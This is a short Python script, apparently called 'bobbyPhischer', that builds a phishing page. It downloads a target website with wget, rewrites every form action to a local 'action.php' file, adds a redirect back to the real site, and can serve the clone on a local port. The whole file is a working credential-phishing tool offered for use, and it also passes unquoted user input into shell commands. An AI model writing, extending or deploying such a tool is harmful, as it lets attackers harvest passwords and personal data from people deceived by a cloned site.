import os
import sys
import time
from bs4 import BeautifulSoup

def help():
    print('python3 bobbyPhischer.py <website url> -> downloads the page and replaces all actions with "action.php"\npython3 bobbyPhischer.py <website url> <port> -> also starts a server on the inserted port ')


def download(website):
    os.system("cd sites;wget -p -k {};cd ..;cp action.php sites/{}/".format(website,website))


def start_server(website,port):
    os.system("cd sites/{}/;php -S 127.0.0.1:{}".format(website,port))


def edit_action(website):
    website = 'sites/{}/index.html'.format(website)
    with open(website,'r', encoding='utf-8') as f:
        content = f.read()
        soup = BeautifulSoup(content,'html.parser')
        for form in soup.find_all('form'):
            form = form.get('action')
            content = content.replace(form,"action.php")
    with open(website,'w', encoding='utf-8') as f:
        f.write(content)
        

def add_redirrect(website):
    with open("sites/{}/action.php".format(website), "a") as myfile:
        myfile.write("\nheader('Location: http://{}');".format(website))

def outro():
    print("DISCLAIMER: this script will probably not work for famous websites, they will require further modification!")


if __name__ == "__main__":
    

    if len(sys.argv) == 2:

        website = sys.argv[1]
        download(website)
        edit_action(website)
        add_redirrect(website)
        outro()
        
    
    elif len(sys.argv) == 3:
        website = sys.argv[1]
        port = sys.argv[2]

        if int(port)> 1024 and int(port)<=60000:
            download(website)
            edit_action(website)
            add_redirrect(website)
            start_server(website,port)
            outro()
        else:
            print("invalid port")
        

    else:
        print("ERROR")
        help()
